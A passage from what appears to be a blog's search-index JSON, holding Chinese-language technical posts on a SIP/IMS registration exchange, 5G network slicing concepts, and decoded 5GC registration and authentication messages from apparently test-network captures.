&#x32;&#57;&#57;&#48;&#x36;&#x40;&#x31;&#55;&#50;&#46;&#49;&#54;&#46;&#x31;&#48;&#54;&#x2e;&#57;&#x32;CSeq: 1 REGISTERRequire: pathContent-Length: 0 4.registerREGISTER sip:ims.mnc000.mcc000.3gppnetwork.org SIP/2.0Contact: sip:460003911000057@172.16.106.92;+g.3gpp.icsi-ref=”urn%3Aurn-7%3A3gpp-service.ims.icsi.mmtel”;+g.3gpp.ics=”principal”Authorization: Digest username=”&#56;&#x36;&#x31;&#51;&#57;&#x31;&#49;&#x30;&#48;&#x30;&#48;&#x35;&#x37;&#64;&#105;&#x6d;&#115;&#x2e;&#x6d;&#110;&#x63;&#x30;&#48;&#x30;&#46;&#x6d;&#99;&#x63;&#48;&#48;&#x30;&#x2e;&#51;&#x67;&#x70;&#112;&#x6e;&#x65;&#x74;&#119;&#x6f;&#x72;&#107;&#x2e;&#x6f;&#114;&#x67;“,realm=”ims.mnc000.mcc000.3gppnetwork.org”,nonce=”89pxm4eQF/BAwKVAYTTZYQAAAAAAALm5/UxxNqNHseE=”,uri=”sip:ims.mnc000.mcc000.3gppnetwork.org”,qop=auth,nc=00000001,cnonce=”a1b2c3d4e5f6”,response=”2c8fd97ca4f530ad249af5e4662ddf4c”,algorithm=AKAv1-MD5,integrity-protected=”no”Expires: 600000Supported: sec-agree,pathCSeq: 2 REGISTERCall-ID: &#x32;&#57;&#57;&#48;&#x36;&#64;&#x31;&#x37;&#x32;&#x2e;&#49;&#x36;&#x2e;&#x31;&#x30;&#x36;&#x2e;&#57;&#x32;From: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=243426378To: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.orgP-Visited-Network-ID: “sip:&#x70;&#x63;&#x73;&#99;&#x66;&#x40;&#49;&#x37;&#x32;&#x2e;&#49;&#x36;&#x2e;&#49;&#x30;&#x36;&#46;&#x38;&#49;:6070”Feature-Caps: *;+g.3gpp.atcf=”tel:+12340000000“;+g.3gpp.atcf-mgmt-uri=”sip:172.16.106.81:6070“;+g.3gpp.atcf-path=”sip:pcscf@172.16.106.81:6070;transport=udp;lr“;+g.3gpp.mid-call;+g.3gpp.srvcc-alertingP-Track-ID: 754087c87c51f31bcc99457db8Route: sip:proxy@172.16.106.94:5060;lr;transport=udpPath: sip:172.16.106.81:6070;transport=udp;lr;key=0a04f65a2b9bdd01d9d7a4b866P-UserAgent-Info: sip:172.16.106.92:5060;transport=udp;+sbc.address=”sip:172.16.106.81:5060;lr;transport=udp“Via: SIP/2.0/UDP 172.16.106.81:6070;branch=z9hG4bKb2f5b1801e38Via: SIP/2.0/UDP 172.16.106.92:5060;branch=z9hG4bK57ab028-c4e7c91fP-Access-Network-Info: 3GPP-NR-TDD; sip:172.16.106.81:5060;lr;transport=udp;ue-ip=172.16.106.92;ue-port=5060;raw-ip=172.16.106.92;raw-port=5060Require: pathP-Charging-Vector: icid-value=2d834d66ac1947be8d2c75938ce7038e;icid-generated-at=pcscf.visited.net;orig-ioi=visited.netMax-Forwards: 69Content-Length: 0 5.200 OKSIP/2.0 200 OKVia: SIP/2.0/UDP 172.16.106.81:6070;branch=z9hG4bKb2f5b1801e38Via: SIP/2.0/UDP 172.16.106.92:5060;branch=z9hG4bK57ab028-c4e7c91fFrom: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=243426378To: sip:460003911000057@ims.mnc000.mcc000.3gppnetwork.org;tag=0-ac106a5f-210323031846-2112256181Call-ID: &#x32;&#x39;&#57;&#48;&#54;&#64;&#x31;&#55;&#x32;&#x2e;&#x31;&#54;&#46;&#x31;&#48;&#x36;&#46;&#x39;&#x32;CSeq: 2 REGISTERContact: sip:460003911000057@172.16.106.94;q=1.0;expires=600000Require: pathContent-Length: 0Service-Route: sip:172.16.106.95:5060;transport=udp;lrPath: sip:172.16.106.81:6070;transport=udp;lr;key=0a04f65a2b9bdd01d9d7a4b866P-Charging-Vector: 2d834d66ac1947be8d2c75938ce7038e;icid-generated-at=pcscf.visited.net;orig-ioi=visited.net;term-ioi=ims.mnc000.mcc000.3gppnetwork.org;access-network-charging-info=test","categories":[{"name":"SIP","slug":"SIP","permalink":"https://wuhaocn.github.io/categories/SIP/"}],"tags":[{"name":"IMS","slug":"IMS","permalink":"https://wuhaocn.github.io/tags/IMS/"}]},{"title":"5GC-网络切片","slug":"network/protocol/5gc/5GC-网络切片","date":"2023-11-15T03:40:25.013Z","updated":"2023-11-15T03:40:25.014Z","comments":true,"path":"2023/11/15/network/protocol/5gc/5GC-网络切片/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/5gc/5GC-%E7%BD%91%E7%BB%9C%E5%88%87%E7%89%87/","excerpt":"","text":"1.切片概述5G网络基于三大业务场景的网络切片，使切片场景更加多样化。 eMBB，提供大带宽流量通道，主要是借助无线侧提升带宽上限。 uRLLC，提供低时延网络，主要借助边缘网络进行边缘计算降低端到端网络距离。 mMTC，提供大规模机器通信，及4G中NB-IOT规范在制定中预计R16版本制定。现在采用4G核心网eLTE增强实现。 切片实现基于核心网信令侧提供切片标识传输，用户面实现切片能力提供。 2. 切片关键点2.1 核心参数 NSSAI 当 UE 发起注册流程时，接入网络（gNB）根据 UE 请求携带的 NSSAI（Network Slice Selection Assistance Information，网络切片选择辅助信息）来选择核心网络子切片的入口AMF。NSSAI是S-NSSAI的集合。NSSAI可以是已配置的NSSAI、请求的NSSAI或允许的NSSAI（Configured NSSAI, a Requested NSSAI or an Allowed NSSAI）。在UE和网络之间的信令消息中，允许和请求的NSSAI最多可以有8个。 S-NSSAI 网络切片主要体现在接纳控制、网络选择和资源分离。标准主要是通过S-NSSAI (Single Network Slice Selection Assistance Information)参数来进行识别 SST 切片/服务类型（SST），它是指在功能和服务方面预期的网络片行为；SST指示S-NSSAI的切片和服务类型，而sst-SD是S-NSSAI参数切片、服务类型的组成和切片分量。该参数的结构如下： SD 切片分量（SD），它是对切片/服务类型进行补充以在同一切片/服务类型的多个网络切片l之间进行区分的可选信息。SD字段有一个保留值“no SD value associated with The SST”定义为十六进制FFFFFF。在某些协议中，不包括SD字段以指示没有SD值与SST关联。 Subscribed S-NSSAIs：订阅S-NSSAI，属于用户的订阅数据。 Default S-NSSAI：默认S-NSSAI，根据运营商的策略，用户的订阅S-NSSAI中可能会一个或多个被设置为默认S-NSSAI；如果UE在注册请求消息（Registration Request）没有携带Allowed NSSAI，则网络会使用默认S-NSSAI来给UE提供服务，如果默认S-NSSAI存在的话。 Requested NSSAI：请求NSSAI，也就是UE在注册请求消息(Registration Request)携带的Allowed NSSAI。 Allowed NSSAI：允许NSSAI，表示UE请求的NSSAI中，哪些S-NSSAI被网络允许了，网络会在注册接收消息（Registration Accept）的”Allowed NSSAI” IE 带给UE。 Rejected NSSAI：拒绝NSSAI，表示UE请求的NSSAI中，哪些S-NSSAI被网络拒绝了，网络会在注册接收消息（Registration Accept）的”Rejected NSSAI” IE 带给UE。 Configured NSSAI：配置NSSAI，网络配置给UE使用的NSSAI，收到这个配置参数收，UE就知道网络下有哪些S-NSSAI可用；网络会在注册接收消息（Registration Accept）的”Configured NSSAI” IE 带给UE，如果注册后UE的配置有变化，则网络可通过Configuration update command通知UE更新；UE会在非易失存储空间保存每个网络给它配置的Configured NSSAI 【见TS24.501 Annex C】；每个PLMN最多只能配置一个Configured NSSAI。 参数结构 1234567nssai s-nssai sst sd s-nssai sst sd 2.2 切片需求来源网络切片的需求来自于业务对网络提出的差异化要求，网络切片设计的出发点是按照业务对网络的不同需求灵活组织网络，形成为特定业务提供专属服务的网络，达到网络与业务的高度匹配。 2.3 切片类型 增强型移动宽带（eMBB）：需要关注峰值速率，容量，频谱效率，移动性，网络能效等这些指标，和 3G、4G 类似。AR/VR、4K/8K 超高清视频等业务属于该类型。 海量机器通信（mMTC）：主要关注连接数。对下载速率，移动性等指标不太关心。针对大规模物联网业务。 高可靠低时延通信（uRLLC）：主要关注高可靠性，移动性和超低时延。对连接数，峰值速率，容量，频谱效率，网络能效等指标都没有太大需求。例如无人驾驶等业务。 2.4 切片特性网络切片具有以下四个特性： 1.隔离性：不同的网络切片之间互相隔离，一个切片的异常不会影响到其他的切片。 2.虚拟化：网络切片是在物理网络上划分出来的虚拟网络。 3.按需定制：可以根据不同的业务需求去自定义网络切片的业务、功能、容量、服务质量与连接关系，还可以按需进行切片的生命周期管理。 4.端到端：网络切片是针对整个网络而言，不仅需要核心网，还要包括接入网、传输网、管理网络等。 2.5 切片层次 无线接入网络子切片：切片资源划分和隔离，切片感知，切片选择，移动性管理，每个切片的 QoS 保障。 承载网络子切片：基于 SDN 的统一管理，承载也可以被抽象成资源池来进行灵活分配，从而切割成网络切片。 核心网络子切片：5G 核心网基于SBA 架构，核心网的微服务模块就像搭积木一样按需拼装成网络切片。 3.切片选择流程UE对网络切片的选择涉及两个关键过程，一个是UE注册流程，一个是PDUSession建立流程。在实际应用中，一个 UE 可能同时接入一个或多个网络切片，当 UE 发起注册流程时，接入网络（gNB）根据 UE 请求携带的 NSSAI（Network Slice Selection Assistance Information，网络切片选择辅助信息）来选择核心网络子切片的入口AMF。NSSAI 包括切片/业务的类型和切片区分标识（Slice Differentiator），这些信息可以是标准定义的，也可以是运营商自定义的。如果 UE 发起注册时，请求没有携带任何 NSSAI 信息，接入网将选择默认的 AMF 提供服务。默认的 AMF 将根据运营商的策略和用户签约信息进一步选择 Target AMF 提供服务。AMF 将与 AUSF 一同对 UE 进行鉴权，鉴权通过后，UE 成功注册到网络。UE 注册成功后，AMF 将向 UE 提供被允许的 NSSAI 和临时用户标识（Temporary User ID），后续 UE 将携带这些信息接入网络，网络根据临时用户标识可以得到之前服务的 AMF 信息。接下来，UE 可以发起业务请求，建立 UE 和 AMF 之间的信令连接，连接过程中或连接建立成功后，UE 和网络之间可以建立 PDU Session。在建立 PDU Session 的过程中，AMF 应综合签约信息、本地策略以及 NSSAI 等信息选择合适的 SMF，SMF 进行 PDU Session 的鉴权，为 UE 分配 IP 地址，指定提供服务的 UPF 提供后续的用户平面服务等。会话建立成功后，AMF 将保存 SMF 和终端的对应关系，SMF 也会保存 AMF 和终端识别的对应关系，以便后续的网络交互。以上是 3GPP 网络切片选择、终端注册、连接建立和会话建立的基本框架。 开户 用户开户时，签约数据中会包含用户支持的切片信息（例如切片 A、B、C，其中 A 和 B 被标记为 “default”，“default” 表示在终端不携带切片信息时，网络侧默认用户支持接入的切片。UE 侧存储在 USIM 卡，网络侧存储在 UDM）。 终端注册 终端初次入网注册时，不会在用户面建立 QoS Flow，所以终端未携带切片信息，AMF 将本地配置的切片信息与从 UDM 获取的用户签约数据中的切片信息进行匹配。 切片校验 如果 AMF 本地配置的切片信息包含签约的默认切片信息，则 AMF 判断可以为终端提供对应切片服务，在注册响应消息中携带用户在当前网络下可以使用的切片 A、B。 接入切换 如果 AMF 本地配置的切片信息中不包含签约的默认切片信息，则 AMF 判断自身不能为终端提供对应切片服务，AMF 查询 NSSF 获取可提供切片服务的其他 AMF 信息，NSSF 响应消息中携带为终端分配的切片配置信息。Target AMF 在注册响应消息中携带用户在当前网络下可以使用的切片 A、B。 应用接入用户激活业务时（例如，用户打开一个 APP）才会携带切片信息，终端会根据步骤 2 中的切片选择策略，选择对应的切片 ID（例如网络切片 A）进行业务触发，AMF 选择切片 A 对应的 SMF 为终端建立 PDU Session。 4.参考https://blog.csdn.net/u010178611/article/details/82109791","categories":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/categories/5G/"}],"tags":[{"name":"5G","slug":"5G","permalink":"https://wuhaocn.github.io/tags/5G/"}]},{"title":"5GC-入网注册报文","slug":"network/protocol/5gc/5GC-入网注册报文","date":"2023-11-15T03:40:25.013Z","updated":"2023-11-15T03:40:25.013Z","comments":true,"path":"2023/11/15/network/protocol/5gc/5GC-入网注册报文/","link":"","permalink":"https://wuhaocn.github.io/2023/11/15/network/protocol/5gc/5GC-%E5%85%A5%E7%BD%91%E6%B3%A8%E5%86%8C%E6%8A%A5%E6%96%87/","excerpt":"","text":"1.总体流程业务流程 2.流程报文2.1 Registration request12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-InitialUEMessage (15) criticality: ignore (1) value InitialUEMessage protocolIEs: 5 items Item 0: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 1: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e004179000d0164f000f0ff000001400224022e02f0f0 Non-Access-Stratum 5GS (NAS)PDU Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Registration request (0x41) 5GS registration type .... 1... = Follow-On Request bit (FOR): Follow-on request pending .... .001 = 5GS registration type: initial registration (1) NAS key set identifier 0... .... = Type of security context flag (TSC): Native security context (for KSIAMF) .111 .... = NAS key set identifier: 7 5GS mobile identity Length: 13 0... .... = Spare: 0 .000 .... = SUPI format: IMSI (0) .... 0... = Spare: 0 .... .001 = Type of identity: SUCI (1) Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) Routing indicator: 0 .... 0000 = Protection scheme Id: NULL scheme (0) Home network public key identifier: 0 Scheme output: 1004204220 UE security capability Element ID: 0x2e Length: 2 1... .... = 5G-EA0: Supported .1.. .... = 128-5G-EA1: Supported ..1. .... = 128-5G-EA2: Supported ...1 .... = 128-5G-EA3: Supported .... 0... = 5G-EA4: Not supported .... .0.. = 5G-EA5: Not supported .... ..0. = 5G-EA6: Not supported .... ...0 = 5G-EA7: Not supported 1... .... = 5G-IA0: Supported .1.. .... = 128-5G-IA1: Supported ..1. .... = 128-5G-IA2: Supported ...1 .... = 128-5G-IA3: Supported .... 0... = 5G-IA4: Not supported .... .0.. = 5G-IA5: Not supported .... ..0. = 5G-IA6: Not supported .... ...0 = 5G-IA7: Not supported Item 2: id-UserLocationInformation ProtocolIE-Field id: id-UserLocationInformation (121) criticality: reject (0) value UserLocationInformation: userLocationInformationNR (1) userLocationInformationNR nR-CGI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) nRCellIdentity: 0x00044880f0 tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) Item 3: id-RRCEstablishmentCause ProtocolIE-Field id: id-RRCEstablishmentCause (90) criticality: ignore (1) value RRCEstablishmentCause: mo-Signalling (3) Item 4: id-UEContextRequest ProtocolIE-Field id: id-UEContextRequest (112) criticality: ignore (1) value UEContextRequest: requested (0) 2.2 Authentication request1234567891011121314151617181920212223242526272829303132333435363738394041424344454647initiatingMessage procedureCode: id-DownlinkNASTransport (4) criticality: ignore (1) value DownlinkNASTransport protocolIEs: 3 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e0056000200002125e821e3a8691f4997ac4956ac6569a8… Non-Access-Stratum 5GS (NAS)PDU Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Authentication request (0x56) 0000 .... = Spare Half Octet: 0 NAS key set identifier - ngKSI .... 0... = Type of security context flag (TSC): Native security context (for KSIAMF) .... .000 = NAS key set identifier: 0 ABBA Length: 2 ABBA Contents: 0x0000 Authentication Parameter RAND - 5G authentication challenge Element ID: 0x21 RAND value: 25e821e3a8691f4997ac4956ac6569a8 Authentication Parameter AUTN (UMTS and EPS authentication challenge) - 5G authentication challenge Element ID: 0x20 Length: 16 AUTN value: 00c6123fefd980001404cf321750dc4c SQN xor AK: 00c6123fefd9 AMF: 8000 MAC: 1404cf321750dc4c 2.3 Authentication response12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-UplinkNASTransport (46) criticality: ignore (1) value UplinkNASTransport protocolIEs: 4 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e00572d10481e2e467f57406efa0caf1e985956ab Non-Access-Stratum 5GS (NAS)PDU Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Authentication response (0x57) Authentication response parameter Element ID: 0x2d Length: 16 RES: 481e2e467f57406efa0caf1e985956ab Item 3: id-UserLocationInformation ProtocolIE-Field id: id-UserLocationInformation (121) criticality: ignore (1) value UserLocationInformation: userLocationInformationNR (1) userLocationInformationNR nR-CGI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) nRCellIdentity: 0x00044880f0 tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) 2.4 Security mode command123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-DownlinkNASTransport (4) criticality: ignore (1) value DownlinkNASTransport protocolIEs: 3 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e039b1e5653007e005d030002f0f057033601021904f0f0… Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0011 = Security header type: Integrity protected with new 5GS security context (3) Message authentication code: 0x9b1e5653 Sequence number: 0 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Security mode command (0x5d) NAS security algorithms 0000 .... = Type of ciphering algorithm: 5G-EA0 (null ciphering algorithm) (0) .... 0011 = Type of integrity protection algorithm: 128-5G-IA3 (3) 0000 .... = Spare Half Octet: 0 NAS key set identifier - ngKSI .... 0... = Type of security context flag (TSC): Native security context (for KSIAMF) .... .000 = NAS key set identifier: 0 UE security capability - Replayed UE security capabilities Length: 2 1... .... = 5G-EA0: Supported .1.. .... = 128-5G-EA1: Supported ..1. .... = 128-5G-EA2: Supported ...1 .... = 128-5G-EA3: Supported .... 0... = 5G-EA4: Not supported .... .0.. = 5G-EA5: Not supported .... ..0. = 5G-EA6: Not supported .... ...0 = 5G-EA7: Not supported 1... .... = 5G-IA0: Supported .1.. .... = 128-5G-IA1: Supported ..1. .... = 128-5G-IA2: Supported ...1 .... = 128-5G-IA3: Supported .... 0... = 5G-IA4: Not supported .... .0.. = 5G-IA5: Not supported .... ..0. = 5G-IA6: Not supported .... ...0 = 5G-IA7: Not supported NAS security algorithms - Selected EPS NAS security algorithms Element ID: 0x57 0... .... = Spare bit(s): 0x00 .000 .... = Type of ciphering algorithm: EPS encryption algorithm EEA0 (null ciphering algorithm) (0) .... 0... = Spare bit(s): 0x00 .... .011 = Type of integrity protection algorithm: EPS integrity algorithm 128-EIA3 (3) Additional 5G security information Element ID: 0x36 Length: 1 .... 0... = Spare: 0 .... .0.. = Spare: 0 .... ..1. = Retransmission of initial NAS message request(RINMR): Requested .... ...0 = Horizontal derivation parameter (HDP): Not required UE security capability - Replayed S1 UE security capabilities Element ID: 0x19 Length: 4 1... .... = EEA0: Supported .1.. .... = 128-EEA1: Supported ..1. .... = 128-EEA2: Supported ...1 .... = 128-EEA3: Supported .... 0... = EEA4: Not supported .... .0.. = EEA5: Not supported .... ..0. = EEA6: Not supported .... ...0 = EEA7: Not supported 1... .... = EIA0: Supported .1.. .... = 128-EIA1: Supported ..1. .... = 128-EIA2: Supported ...1 .... = 128-EIA3: Supported .... 0... = EIA4: Not supported .... .0.. = EIA5: Not supported .... ..0. = EIA6: Not supported .... ...0 = EIA7: Not supported 1... .... = UEA0: Supported .1.. .... = UEA1: Supported ..0. .... = UEA2: Not supported ...0 .... = UEA3: Not supported .... 0... = UEA4: Not supported .... .0.. = UEA5: Not supported .... ..0. = UEA6: Not supported .... ...0 = UEA7: Not supported 1... .... = Spare bit(s): 0x1 .1.. .... = UMTS integrity algorithm UIA1: Supported ..0. .... = UMTS integrity algorithm UIA2: Not supported ...0 .... = UMTS integrity algorithm UIA3: Not supported .... 0... = UMTS integrity algorithm UIA4: Not supported .... .0.. = UMTS integrity algorithm UIA5: Not supported .... ..0. = UMTS integrity algorithm UIA6: Not supported .... ...0 = UMTS integrity algorithm UIA7: Not supported 2.5 Security mode complete Registration request123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-UplinkNASTransport (46) criticality: ignore (1) value UplinkNASTransport protocolIEs: 4 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-NAS-PDU ProtocolIE-Field id: id-NAS-PDU (38) criticality: reject (0) value NAS-PDU: 7e04504ffe7e007e005e7100307e004179000d0164f000f0… Non-Access-Stratum 5GS (NAS)PDU Security protected NAS 5GS message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0100 = Security header type: Integrity protected and ciphered with new 5GS security context (4) Message authentication code: 0x504ffe7e Sequence number: 0 Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Security mode complete (0x5e) NAS message container Element ID: 0x71 Length: 48 Non-Access-Stratum 5GS (NAS)PDU Plain NAS 5GS Message Extended protocol discriminator: 5G mobility management messages (126) 0000 .... = Spare Half Octet: 0 .... 0000 = Security header type: Plain NAS message, not security protected (0) Message type: Registration request (0x41) 5GS registration type .... 1... = Follow-On Request bit (FOR): Follow-on request pending .... .001 = 5GS registration type: initial registration (1) NAS key set identifier 0... .... = Type of security context flag (TSC): Native security context (for KSIAMF) .111 .... = NAS key set identifier: 7 5GS mobile identity Length: 13 0... .... = Spare: 0 .000 .... = SUPI format: IMSI (0) .... 0... = Spare: 0 .... .001 = Type of identity: SUCI (1) Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) Routing indicator: 0 .... 0000 = Protection scheme Id: NULL scheme (0) Home network public key identifier: 0 Scheme output: 1004204220 5GMM capability Element ID: 0x10 Length: 1 0... .... = Spare: 0 .0.. .... = Spare: 0 ..0. .... = Spare: 0 ...0 .... = Spare: 0 .... 0... = Spare: 0 .... .0.. = LTE Positioning Protocol (LPP) capability: Not Requested .... ..1. = HO attach: Supported .... ...1 = S1 mode: Requested UE security capability Element ID: 0x2e Length: 2 1... .... = 5G-EA0: Supported .1.. .... = 128-5G-EA1: Supported ..1. .... = 128-5G-EA2: Supported ...1 .... = 128-5G-EA3: Supported .... 0... = 5G-EA4: Not supported .... .0.. = 5G-EA5: Not supported .... ..0. = 5G-EA6: Not supported .... ...0 = 5G-EA7: Not supported 1... .... = 5G-IA0: Supported .1.. .... = 128-5G-IA1: Supported ..1. .... = 128-5G-IA2: Supported ...1 .... = 128-5G-IA3: Supported .... 0... = 5G-IA4: Not supported .... .0.. = 5G-IA5: Not supported .... ..0. = 5G-IA6: Not supported .... ...0 = 5G-IA7: Not supported NSSAI - Requested NSSAI Element ID: 0x2f Length: 5 S-NSSAI 1 Length: 4 Slice/service type (SST): 1 Slice differentiator (SD): 1 UE network capability Element ID: 0x17 Length: 7 1... .... = EEA0: Supported .1.. .... = 128-EEA1: Supported ..1. .... = 128-EEA2: Supported ...1 .... = 128-EEA3: Supported .... 0... = EEA4: Not supported .... .0.. = EEA5: Not supported .... ..0. = EEA6: Not supported .... ...0 = EEA7: Not supported 1... .... = EIA0: Supported .1.. .... = 128-EIA1: Supported ..1. .... = 128-EIA2: Supported ...1 .... = 128-EIA3: Supported .... 0... = EIA4: Not supported .... .0.. = EIA5: Not supported .... ..0. = EIA6: Not supported .... ...0 = EIA7: Not supported 1... .... = UEA0: Supported .1.. .... = UEA1: Supported ..0. .... = UEA2: Not supported ...0 .... = UEA3: Not supported .... 0... = UEA4: Not supported .... .0.. = UEA5: Not supported .... ..0. = UEA6: Not supported .... ...0 = UEA7: Not supported 1... .... = UCS2 support (UCS2): The UE has no preference between the use of the default alphabet and the use of UCS2 .1.. .... = UMTS integrity algorithm UIA1: Supported ..0. .... = UMTS integrity algorithm UIA2: Not supported ...0 .... = UMTS integrity algorithm UIA3: Not supported .... 0... = UMTS integrity algorithm UIA4: Not supported .... .0.. = UMTS integrity algorithm UIA5: Not supported .... ..0. = UMTS integrity algorithm UIA6: Not supported .... ...0 = UMTS integrity algorithm UIA7: Not supported 0... .... = ProSe direct discovery: Not supported .0.. .... = ProSe: Not supported ..0. .... = H.245 After SRVCC Handover: Not supported ...0 .... = Access class control for CSFB: Not supported .... 0... = LTE Positioning Protocol: Not supported .... .0.. = Location services (LCS) notification mechanisms: Not supported .... ..0. = SRVCC from E-UTRAN to cdma2000 1xCS: Not supported .... ...1 = Notification procedure: Supported 1... .... = Extended protocol configuration options: Supported .0.. .... = Header compression for control plane CIoT EPS optimization: Not supported ..0. .... = EMM-REGISTERED w/o PDN connectivity: Not supported ...0 .... = S1-U data transfer: Not supported .... 0... = User plane CIoT EPS optimization: Not supported .... .0.. = Control plane CIoT EPS optimization: Not supported .... ..0. = ProSe UE-to-network relay: Not supported .... ...0 = ProSe direct communication: Not supported 0... .... = Spare bit(s): 0x00 0... .... = Signalling for a maximum number of 15 EPS bearer contexts: Not supported .0.. .... = Service gap control: Not supported ..1. .... = N1 mode: Supported ...1 .... = Dual connectivity with NR: Supported .... 0... = Control plane data backoff: Not supported .... .0.. = Restriction on use of enhanced coverage: Not supported .... ..0. = V2X communication over PC5: Not supported .... ...0 = Multiple DRB: Not supported UE&#x27;s usage setting Element ID: 0x18 Length: 1 .... 0... = Spare: 0 .... .0.. = Spare: 0 .... ..0. = Spare: 0 .... ...0 = UE&#x27;s usage setting: Voice centric 5GS update type Element ID: 0x53 Length: 1 .... 0... = Spare: 0 .... .0.. = Spare: 0 .... ..0. = NG-RAN Radio Capability Update (NG-RAN-RCU): Not Needed .... ...1 = SMS requested: SMS over NAS supported Item 3: id-UserLocationInformation ProtocolIE-Field id: id-UserLocationInformation (121) criticality: ignore (1) value UserLocationInformation: userLocationInformationNR (1) userLocationInformationNR nR-CGI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) nRCellIdentity: 0x00044880f0 tAI pLMNIdentity: 64f000 Mobile Country Code (MCC): China (000) Mobile Network Code (MNC): China Mobile (00) tAC: 4388 (0x001124) 2.6 InitialContextSetupRequest Registration Accept123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236NGAP-PDU: initiatingMessage (0) initiatingMessage procedureCode: id-InitialContextSetup (14) criticality: reject (0) value InitialContextSetupRequest protocolIEs: 11 items Item 0: id-AMF-UE-NGAP-ID ProtocolIE-Field id: id-AMF-UE-NGAP-ID (10) criticality: reject (0) value AMF-UE-NGAP-ID: 2155872278 Item 1: id-RAN-UE-NGAP-ID ProtocolIE-Field id: id-RAN-UE-NGAP-ID (85) criticality: reject (0) value RAN-UE-NGAP-ID: 4194571 Item 2: id-UEAggregateMaximumBitRate ProtocolIE-Field id: id-UEAggregateMaximumBitRate (110) criticality: reject (0) value UEAggregateMaximumBitRate uEAggregateMaximumBitRateDL: 1024bits/s uEAggregateMaximumBitRateUL: 256bits/s Item 3: id-CoreNetworkAssistanceInformationForInactive ProtocolIE-Field 